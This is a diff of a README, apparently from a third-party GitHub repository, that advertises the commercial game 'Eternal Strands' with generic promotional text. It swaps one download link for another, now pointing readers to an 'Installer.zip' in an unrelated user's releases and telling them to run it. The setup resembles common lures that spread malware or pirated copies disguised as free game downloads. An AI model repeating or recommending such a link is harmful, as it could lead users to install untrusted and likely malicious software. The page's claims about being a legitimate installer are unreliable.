@@ -8,6 +8,7 @@ _Eternal Strands_ is an action-packed RPG that offers players an immersive adven
 In _Eternal Strands_, strategy and action go hand in hand. The game features an open world where every decision shapes the narrative. Customize your character, forge alliances, and face challenges that test your skills and moral compass. From thrilling combat to engaging storylines, _Eternal Strands_ is an experience that keeps you hooked.
 
 As you navigate through the game's world, you’ll find yourself confronted by factions, each with their own motives. Choose your allegiances carefully as these choices impact your story progression, offering a unique experience each time you play.
+
 ![image](https://github.com/user-attachments/assets/eb590a0a-1b8f-4bab-bf29-05c3451fc494)
 ![image](https://github.com/user-attachments/assets/e7cf5eb3-5c68-4187-af50-85029efe7cec)
 ![image](https://github.com/user-attachments/assets/6a221e15-ea7f-478c-a1d5-645c7c95193e)
@@ -18,7 +19,7 @@ As you navigate through the game's world, you’ll find yourself confronted by f
 ### Download and Installation Instructions
 
 1. **Download the Installer**:  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**:  
    Once the download is complete, open the installer file to begin the installation process.
